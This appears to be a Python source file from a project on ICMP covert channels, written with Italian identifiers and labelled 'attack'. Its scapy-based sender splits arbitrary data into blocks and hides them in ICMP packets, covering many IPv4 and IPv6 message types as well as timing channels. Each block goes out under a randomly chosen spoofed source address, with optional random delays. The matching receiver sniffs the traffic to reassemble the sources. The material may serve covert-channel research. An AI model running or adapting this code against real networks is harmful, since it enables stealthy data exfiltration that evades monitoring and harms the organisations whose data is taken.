from attack.attack_methods import set_host_list, get_typeAtacco
from Programma.methods.check_type import is_enum_member, is_ipaddress, is_list, is_boolean, is_bytes
from custom_enum import ATTACK_TYPE, SENDER_TYPE, MSG, ICMP_TYPE
from Programma.classes import GET_MAC_ADDRESS, INTERFACE_FROM_IP
from Programma.methods.network_methods import ping_once, get_local_IP, get_hosts_attivi, default_interface
from scapy.all import Ether, IP, ICMP, Raw, sendp, random, sniff
from attack.attack_classes import _IPx
from attack.attack_classes import IPV4_INFORMATION, IPV4_TIMESTAMP, IPV4_REDIRECT, IPV4_SOURCE_QUENCH, IPV4_PARAMETER_PROBLEM, IPV4_TIME_EXCEEDED, IPV4_DESTINATION_UNRECHABLE, IPV4_ECHO, IPV4_TIMING_8BIT, IPV4_TIMING_8BIT_NOISE
from attack.attack_classes import IPV6_ECHO, IPV6_PARAMETER_PROBLEM, IPV6_TIME_EXCEEDED, IPV6_PACKET_BIG, IPV6_DESTINTION_UNREACHABLE
from enum import Enum 
from config import block_size, min_wait, max_wait, DEBUG
import ipaddress, time


class SendSingleton: 
    def __init__(self, type_attacco:Enum=None, type_sender:Enum=None, use_delay:bool=False): 
        if not is_enum_member(type_attacco, ATTACK_TYPE): 
            raise TypeError("type_attacco non ATTACK_TYPE: ") 
        self.type_attacco=type_attacco  
        if not is_enum_member(type_sender, SENDER_TYPE): 
            raise TypeError("type_sender non SENDER_TYPE") 
        self.type_sender=type_sender
        if not is_boolean(use_delay):
            raise TypeError("use_delay non boolean") 
        self.use_delay=use_delay
        self.host_list=set_host_list(self.type_sender) 
        if not is_list(self.host_list) or len(self.host_list)<=0 or any(not is_ipaddress(ip) for ip in self.host_list): 
            raise ValueError("host_list non valida")  
    
    def send_host_attivi(self, ip_dst:ipaddress.IPv4Address=None):  
        if not is_ipaddress(ip_dst): 
            raise TypeError("ip_dst: non valido")
        dst_mac=GET_MAC_ADDRESS(ip_dst).mac_address.strip().replace("-",":").lower() 
        if not dst_mac: raise ValueError("dst_mac non valido") 
        default_interface=default_interface()
        ping_once(ip_dst, default_interface) 
        interface=(
            INTERFACE_FROM_IP(ip_dst).interface or 
            default_interface
        )  
        if not interface: 
            raise ValueError("interface non valida") 
        if DEBUG: 
            print("send_host_attivi: ESECUZIONE DEBUG")
            return
        #----------------------------
        msg=MSG.START_SOURCES.value
        for host in self.host_list: 
            if not is_ipaddress(host):
                print("Host non valido: ",host) 
                continue 
            indirizzo_IP=host.compressed
            if len(msg+indirizzo_IP)>64: 
                #print("MESSAGGIO: ",len(msg),"\t",msg) 
                pkt = ( 
                    Ether(dst=dst_mac)
                    / IP(dst=ip_dst.compressed) 
                    / ICMP(type=0, id=23, seq=0)  
                    /Raw(load=(msg).encode()) 
                ) 
                sendp(pkt, verbose=1, iface=interface) 
                msg=MSG.START_SOURCES.value+indirizzo_IP
            else: msg=msg+";"+indirizzo_IP
        #print("MESSAGGIO: ",len(msg),"\t",msg)
        pkt = ( 
            Ether(dst=dst_mac)
            / IP(dst=ip_dst.compressed) 
            / ICMP(type=0, id=23, seq=0)  
            /Raw(load=(msg+MSG.END_SOURCES.value).encode()) 
        ) 
        sendp(pkt, verbose=1, iface=interface) 

    def send_data(self, data:bytes=None, ip_dst:ipaddress.IPv4Address=None):  
        if not is_bytes(data): 
            raise TypeError("data non byte")
        if not is_ipaddress(ip_dst): 
            raise TypeError("ip_dst non valido")  
        sender=get_typeAtacco(self.type_attacco, ip_dst, self.host_list) 
        if not sender: 
            raise Exception("Errore nella creazione del sender: ", sender)
        self.send_host_attivi(ip_dst) 
        for i in range(0, len(data), block_size): 
            ip_src=ipaddress.ip_address(random.choice(self.host_list)) if self.host_list else None 
            if not ip_src: 
                print("Nessun host disponibile per inviare i dati") 
                return
            print("IP_SRC:",ip_src)
            if self.use_delay: 
                print("#"*10+"\n"+"#"*10+"\n"+"#"*10+"\n"+"#"*10+"\n"+"#"*10+"\n")
                wait_time=random.uniform(min_wait,max_wait)
                print(f"Waiting {wait_time} seconds...")
                time.sleep(wait_time) 
            try:
                sender.send(data[i:i+block_size],self.type_attacco,ip_src) 
            except Exception as e: 
                print("send data IPV4: ",e) 
        sender.send_last()

class ReceiveSingleton:  
    attacco=None 
    ip_dst=None
    host_attivi=None 
    stop_flag={"value":False} 
    wait_class=None

    def __init__(self, attacco:Enum=None): 
        if not is_enum_member(attacco, ATTACK_TYPE): 
            raise TypeError("attacco non valido")  
        self.attacco=attacco  
        self.ip_dst,err=get_local_IP() 
        if err or not is_ipaddress(self.ip_dst): 
            print(err)
            raise Exception(f"ip_dst non valido") 
        self.wait_host_attivi() 
        if not is_list(self.host_attivi) or len(self.host_attivi)<=0 or any(not is_ipaddress(ip) for ip in self.host_attivi): 
            raise ValueError("host_attivi non valido")
        if self.ip_dst.version==4: 
            match self.attacco: 
                case ATTACK_TYPE.ipv4_information: 
                    self.wait_class=IPV4_INFORMATION(self.ip_dst, self.host_attivi) 
                case ATTACK_TYPE.ipv4_timestamp: 
                    self.wait_class=IPV4_TIMESTAMP(self.ip_dst, self.host_attivi)
                case ATTACK_TYPE.ipv4_redirect: 
                    self.wait_class=IPV4_REDIRECT(self.ip_dst, self.host_attivi)
                case ATTACK_TYPE.ipv4_source_quench | ATTACK_TYPE.ipv4_source_quench_unused: 
                    self.wait_class=IPV4_SOURCE_QUENCH(self.ip_dst, self.host_attivi)
                case ATTACK_TYPE.ipv4_parameter_problem | ATTACK_TYPE.ipv4_parameter_problem_unused: 
                    self.wait_class=IPV4_PARAMETER_PROBLEM(self.ip_dst, self.host_attivi)
                case ATTACK_TYPE.ipv4_time_exceeded | ATTACK_TYPE.ipv4_time_exceeded_unused: 
                    self.wait_class=IPV4_TIME_EXCEEDED(self.ip_dst, self.host_attivi) 
                case ATTACK_TYPE.ipv4_destination_unreachable | ATTACK_TYPE.ipv4_destination_unreachable_unused: 
                    self.wait_class=IPV4_DESTINATION_UNRECHABLE(self.ip_dst, self.host_attivi)
                case ATTACK_TYPE.ipv4_echo_campi|ATTACK_TYPE.ipv4_echo_payload|ATTACK_TYPE.ipv4_echo_campi_payload|ATTACK_TYPE.ipv4_echo_random_payload: 
                    self.wait_class=IPV4_ECHO(self.ip_dst, self.host_attivi, self.attacco)
                case ATTACK_TYPE.ipv4_timing_channel_8bit: 
                    self.wait_class=IPV4_TIMING_8BIT(self.ip_dst, self.host_attivi)
                case ATTACK_TYPE.ipv4_timing_channel_8bit_noise: 
                    self.wait_class=IPV4_TIMING_8BIT_NOISE(
                        self.ip_dst, 
                        self.host_attivi, 
                        {"min_delay":1, "max_delay":30, "rumore":2, "seed":4582}
                    ) 
                case _: raise Exception(f"ReceiveSingleton: tipologia non conosciuta: {self.attacco}")
        elif self.ip_dst.version==6: 
            match self.attacco: 
                case ATTACK_TYPE.ipv6_echo:  
                    self.wait_class=IPV6_ECHO(self.ip_dst, self.host_attivi)
                case ATTACK_TYPE.ipv6_parameter_problem: 
                    self.wait_class=IPV6_PARAMETER_PROBLEM(self.ip_dst, self.host_attivi)
                case ATTACK_TYPE.ipv6_time_exceeded: 
                    self.wait_class=IPV6_TIME_EXCEEDED(self.ip_dst, self.host_attivi)
                case ATTACK_TYPE.ipv6_packet_to_big: 
                    self.wait_class=IPV6_PACKET_BIG(self.ip_dst, self.host_attivi)
                case ATTACK_TYPE.ipv6_destination_unreachable: 
                    self.wait_class=IPV6_DESTINTION_UNREACHABLE(self.ip_dst, self.host_attivi) 
                case _: raise Exception(f"ReceiveSingleton: Tipologia non conosciuta: {self.attacco}")
        else:
            raise Exception(f"ReceiveSingleton: versione IP non conosciuta: {self.ip_dst.version}") 
        if not isinstance(self.wait_class, _IPx): 
            raise TypeError("wait_class non valida") 
    
    def check_self_var(self):  
        if not is_enum_member(self.attacco, ATTACK_TYPE): 
            raise TypeError("attacco non valido") 
        #if not is_list(self.host_attivi) or len(self.host_attivi)<=0 or any(not is_ipaddress(ip) for ip in self.host_attivi): 
        #    raise ValueError("host_attivi non valida") 
        if not is_ipaddress(self.ip_dst): 
            raise TypeError("ip_dst non valido")  
        #if not isinstance(self.wait_class, _IPx): 
        #    raise TypeError("wait_class non valida") 
    
    def get_callback(self): 
        def callback(pkt):  
            print("Pacchetto ricevuto: ", pkt.summary())  
            if pkt.haslayer("ICMP") and pkt.haslayer("Raw") and (pkt["ICMP"].type==8 or pkt["ICMP"].type==0): 
                if pkt[ICMP].id==23 and MSG.START_SOURCES.value.encode() in pkt["Raw"].load: 
                    if MSG.END_SOURCES.value.encode() in pkt["Raw"].load: 
                        self.stop_flag["value"]=True 
                    IPsources=pkt["Raw"].load.decode()
                    IPsources=IPsources.replace(MSG.START_SOURCES.value,"")
                    IPsources=IPsources.replace(MSG.END_SOURCES.value,"")
                    IPsources=IPsources.strip().split(";") 
                    for x in IPsources: 
                        try:
                            ipSRC=ipaddress.ip_address(x)
                            if ipSRC.version==self.ip_dst.version: 
                                self.host_attivi.append(ipSRC) 
                            else: 
                                print("IP versione non corretta: ",self.ip_dst.version," ", ipSRC)
                        except Exception as e:
                            print("Errore nell'aggiunta degli host attivi: ", e)
            elif pkt.haslayer("Padding"):
                print("Padding load: ", pkt["Padding"].load) 
        return callback 
    
    def wait_host_attivi(self):  
        def get_filter(): 
            TYPE_ECHO_REQUEST=ICMP_TYPE.v4_Echo_Request if self.ip_dst.version==4 else ICMP_TYPE.v6_Echo_Request
            TYPE_ECHO_REPLY=ICMP_TYPE.v6_Echo_Reply if self.ip_dst.version==4 else ICMP_TYPE.v6_Echo_Reply 
            str_icmp="icmp" if self.ip_dst.version==4 else "icmp6"
            filter=str_icmp
            filter=filter+f" and ({str_icmp}[0]=={TYPE_ECHO_REQUEST} or {str_icmp}[0]=={TYPE_ECHO_REPLY})"
            filter=filter+f" and dst {self.ip_dst.compressed}" 
            return filter 
        def get_stop_filter(): 
            def stop_filter(pkt): 
                return self.stop_flag["value"] 
            return stop_filter 
        self.check_self_var()
        if (DEBUG): 
            print("wait_host_attivi: ESECUZIONE DEBUG")
            self.host_attivi=[ipaddress.ip_address("192.168.1.15")] 
            if not is_list(self.host_attivi) or len(self.host_attivi)<=0 or any(not is_ipaddress(ip) for ip in self.host_attivi): 
                raise ValueError("host_attivi non valida") 
            return
        print("In ascolto dei pacchetti ICMP...")
        sniff( 
            filter=get_filter()
            ,prn=self.get_callback()
            ,store=False 
            ,stop_filter=get_stop_filter() 
        ) 
        #print("Host attivi trovati: ", self.host_attivi) 
        if not is_list(self.host_attivi) or len(self.host_attivi)<=0 or any(not is_ipaddress(ip) for ip in self.host_attivi): 
            raise ValueError("host_attivi non valida") 



